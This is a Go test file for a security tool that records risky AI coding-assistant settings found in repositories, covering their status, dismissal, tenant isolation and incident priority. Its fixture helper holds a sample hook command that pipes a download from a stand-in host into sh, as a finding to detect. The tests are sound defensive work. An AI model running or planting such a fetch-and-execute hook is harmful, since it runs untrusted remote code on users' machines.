package store_test

import (
	"context"
	"errors"
	"strings"
	"testing"
	"time"

	"github.com/stackurity/stackurity/internal/model"
	"github.com/stackurity/stackurity/internal/store"
	"github.com/stackurity/stackurity/internal/tenant"
	"github.com/stackurity/stackurity/internal/testdb"
)

func setting(c, path, rule, severity string) model.AssistantFinding {
	return model.AssistantFinding{Rule: rule, Title: "Downloads and runs code", Severity: severity, Path: path, Line: 4,
		Tool: "claude-code", Setting: "hooks.SessionStart", Command: "curl -s https://x.io/" + c + " | sh", Fingerprint: fp(c)}
}

// assistantBatch is a repository's batch with an assistant configuration
// scan.
func assistantBatch(name string, ids []model.Identifier, complete bool, found ...model.AssistantFinding) *model.ObservationBatch {
	b := batch(ids, true, "pkg:deb/debian/bash@5.2")
	b.Asset.Name = name
	b.AssistantConfig = &model.AssistantScan{Found: found, Complete: complete, Files: 2}
	if found == nil {
		b.AssistantConfig.Found = []model.AssistantFinding{}
	}
	if !complete {
		b.AssistantConfig.Reason = ".vscode/tasks.json is not valid JSON"
	}
	b.ObservedAt = time.Now().UTC()
	if err := b.Validate(); err != nil {
		panic(err)
	}
	return b
}

func assistantState(t *testing.T, s *store.Store, ctx context.Context, assetID int64) map[string]string {
	t.Helper()
	fs, _, err := s.ListAssistantFindings(ctx, store.AssistantFilter{AssetID: assetID, Status: "all"})
	if err != nil {
		t.Fatal(err)
	}
	out := map[string]string{}
	for _, f := range fs {
		out[f.Path] = f.Status + "/" + f.Resolution
	}
	return out
}

func TestAssistantIngest(t *testing.T) {
	ctx := tenant.WithWorkspace(context.Background(), tenant.DefaultWorkspace)
	s := store.New(testdb.New(t))

	r, err := s.Ingest(ctx, assistantBatch("web-1", mid, true, setting("a", ".claude/settings.json", "remote-code", "critical"),
		setting("b", ".mcp.json", "mcp-unpinned", "low")), 0)
	if err != nil {
		t.Fatal(err)
	}
	if r.AssistantFound != 2 || r.AssistantGone != 0 {
		t.Errorf("first scan: %+v", r)
	}
	id := r.AssetID

	// An incomplete scan that misses one does not resolve it.
	if r, err = s.Ingest(ctx, assistantBatch("web-1", mid, false, setting("a", ".claude/settings.json", "remote-code", "critical")), 0); err != nil || r.AssistantGone != 0 {
		t.Fatalf("incomplete scan: %+v %v", r, err)
	}
	if got := assistantState(t, s, ctx, id); got[".mcp.json"] != "open/" {
		t.Errorf("after an incomplete scan: %v", got)
	}
	scans, err := s.AssistantScans(ctx, id)
	if err != nil || len(scans) != 1 || scans[0].Complete || scans[0].Reason == "" || scans[0].Found != 1 || scans[0].Files != 2 {
		t.Errorf("scans after an incomplete scan: %+v %v", scans, err)
	}

	// A complete one does.
	if r, err = s.Ingest(ctx, assistantBatch("web-1", mid, true, setting("a", ".claude/settings.json", "remote-code", "critical")), 0); err != nil || r.AssistantGone != 1 {
		t.Fatalf("complete scan: %+v %v", r, err)
	}
	if got := assistantState(t, s, ctx, id); got[".mcp.json"] != "resolved/gone" || got[".claude/settings.json"] != "open/" {
		t.Errorf("after a complete scan: %v", got)
	}

	// Dismissed stays dismissed when seen again; gone opens again.
	fs, _, _ := s.ListAssistantFindings(ctx, store.AssistantFilter{AssetID: id})
	if len(fs) != 1 || !strings.Contains(fs[0].Why, "tampered") || fs[0].Command == "" || fs[0].Tool != "claude-code" {
		t.Fatalf("open findings: %+v", fs)
	}
	if _, err := s.DismissAssistantFinding(ctx, fs[0].ID, nil, "our own bootstrap script"); err != nil {
		t.Fatal(err)
	}
	if _, err = s.Ingest(ctx, assistantBatch("web-1", mid, true, setting("a", ".claude/settings.json", "remote-code", "critical"),
		setting("b", ".mcp.json", "mcp-unpinned", "low")), 0); err != nil {
		t.Fatal(err)
	}
	if got := assistantState(t, s, ctx, id); got[".claude/settings.json"] != "resolved/dismissed" || got[".mcp.json"] != "open/" {
		t.Errorf("after seen again: %v", got)
	}
	// Opened again on purpose; one gone cannot be.
	f, err := s.UndismissAssistantFinding(ctx, fs[0].ID)
	if err != nil || f.Status != "open" || f.ResolutionNote != "" {
		t.Fatalf("undismiss: %+v %v", f, err)
	}
	if _, err := s.UndismissAssistantFinding(ctx, fs[0].ID); !errors.Is(err, store.ErrConflict) {
		t.Errorf("undismiss of an open finding: %v", err)
	}
	if _, _, err := s.ListAssistantFindings(ctx, store.AssistantFilter{Severity: "urgent"}); !errors.Is(err, store.ErrInvalid) {
		t.Errorf("bad severity: %v", err)
	}
	if n, err := s.AssistantScannedAssets(ctx); err != nil || n != 1 {
		t.Errorf("scanned assets: %d %v", n, err)
	}
}

// A batch without a scan (an older collector) changes nothing.
func TestAssistantNoScanKeepsFindings(t *testing.T) {
	ctx := tenant.WithWorkspace(context.Background(), tenant.DefaultWorkspace)
	s := store.New(testdb.New(t))
	r, err := s.Ingest(ctx, assistantBatch("web-1", mid, true, setting("a", ".claude/settings.json", "remote-code", "critical")), 0)
	if err != nil {
		t.Fatal(err)
	}
	b := assistantBatch("web-1", mid, true)
	b.AssistantConfig = nil
	if _, err := s.Ingest(ctx, b, 0); err != nil {
		t.Fatal(err)
	}
	if got := assistantState(t, s, ctx, r.AssetID); got[".claude/settings.json"] != "open/" {
		t.Errorf("after a batch with no scan: %v", got)
	}
}

func TestAssistantIsolation(t *testing.T) {
	bg := context.Background()
	s := store.New(testdb.New(t))
	a := tenant.WithWorkspace(bg, tenant.DefaultWorkspace)
	wsB, _, err := s.CreateWorkspace(bg, "B", "", "b@x.io", "", "Correct horse battery 1!")
	if err != nil {
		t.Fatal(err)
	}
	b := tenant.WithWorkspace(bg, wsB.ID)

	r1, err := s.Ingest(a, assistantBatch("web-1", mid, true, setting("a", ".claude/settings.json", "remote-code", "critical")), 0)
	if err != nil {
		t.Fatal(err)
	}
	r2, err := s.Ingest(a, assistantBatch("web-2", []model.Identifier{{Scheme: "machine-id", Value: "m2"}}, true,
		setting("b", ".mcp.json", "mcp-from-url", "high")), 0)
	if err != nil {
		t.Fatal(err)
	}
	// Another organisation sees none of them and cannot dismiss them.
	if fs, n, err := s.ListAssistantFindings(b, store.AssistantFilter{Status: "all"}); err != nil || n != 0 || len(fs) != 0 {
		t.Errorf("B sees %v (%d) %v", fs, n, err)
	}
	all, _, _ := s.ListAssistantFindings(a, store.AssistantFilter{})
	if len(all) != 2 {
		t.Fatalf("A sees %d findings", len(all))
	}
	if _, err := s.DismissAssistantFinding(b, all[0].ID, nil, ""); err == nil {
		t.Error("B dismissed A's finding")
	}
	if sc, _ := s.AssistantScans(b, r1.AssetID); len(sc) != 0 {
		t.Errorf("B sees A's scans: %+v", sc)
	}
	// A project member sees only the project's assets' findings.
	p, err := s.CreateProject(a, "one", "")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := s.AddProjectAssets(a, p.ID, []int64{r1.AssetID}); err != nil {
		t.Fatal(err)
	}
	narrowed := tenant.WithProject(a, p.ID)
	fs, n, err := s.ListAssistantFindings(narrowed, store.AssistantFilter{})
	if err != nil || n != 1 || fs[0].AssetID != r1.AssetID {
		t.Errorf("narrowed sees %+v (%d) %v", fs, n, err)
	}
	var other int64
	for _, f := range all {
		if f.AssetID == r2.AssetID {
			other = f.ID
		}
	}
	if _, err := s.GetAssistantFinding(narrowed, other); err == nil {
		t.Error("narrowed read another project's finding")
	}
	if _, err := s.DismissAssistantFinding(narrowed, other, nil, ""); err == nil {
		t.Error("narrowed dismissed another project's finding")
	}
}

func TestAssistantIncidents(t *testing.T) {
	ctx := tenant.WithWorkspace(context.Background(), tenant.DefaultWorkspace)
	s := store.New(testdb.New(t))
	sync := func() []store.Incident {
		t.Helper()
		sys, err := s.DetectSystemProblems(ctx)
		if err != nil {
			t.Fatal(err)
		}
		if err := s.SyncSystemIncidents(ctx, sys); err != nil {
			t.Fatal(err)
		}
		incs, _, err := s.ListIncidents(ctx, store.IncidentFilter{Kind: "assistant"})
		if err != nil {
			t.Fatal(err)
		}
		return incs
	}
	// Low and medium findings are listed, never alerted on.
	r, err := s.Ingest(ctx, assistantBatch("repo-1", mid, true, setting("a", ".mcp.json", "mcp-unpinned", "low"),
		setting("b", ".claude/settings.json", "network", "medium")), 0)
	if err != nil {
		t.Fatal(err)
	}
	if incs := sync(); len(incs) != 0 {
		t.Errorf("low and medium findings raised %+v", incs)
	}
	// A high one raises a P2 incident on the asset; a critical one makes it P1.
	if _, err := s.Ingest(ctx, assistantBatch("repo-1", mid, true, setting("c", ".cursor/mcp.json", "mcp-from-url", "high")), 0); err != nil {
		t.Fatal(err)
	}
	incs := sync()
	if len(incs) != 1 || incs[0].Priority != "P2" || incs[0].Key != "asset:"+itoa64(r.AssetID) || !strings.Contains(incs[0].Title, "AI assistant setting") {
		t.Fatalf("high finding: %+v", incs)
	}
	if _, err := s.Ingest(ctx, assistantBatch("repo-1", mid, true, setting("c", ".cursor/mcp.json", "mcp-from-url", "high"),
		setting("d", ".claude/settings.json", "remote-code", "critical")), 0); err != nil {
		t.Fatal(err)
	}
	if incs = sync(); len(incs) != 1 || incs[0].Priority != "P1" || !strings.Contains(incs[0].Title, "2 risky AI assistant settings") {
		t.Fatalf("critical finding: %+v", incs)
	}
	// Gone from a complete scan: the incident is resolved.
	if _, err := s.Ingest(ctx, assistantBatch("repo-1", mid, true), 0); err != nil {
		t.Fatal(err)
	}
	if incs = sync(); len(incs) != 0 {
		t.Errorf("open after the findings went: %+v", incs)
	}
	all, _, _ := s.ListIncidents(ctx, store.IncidentFilter{Kind: "assistant", Status: "all"})
	if len(all) != 1 || all[0].Status != "resolved" {
		t.Errorf("resolved incident: %+v", all)
	}
}
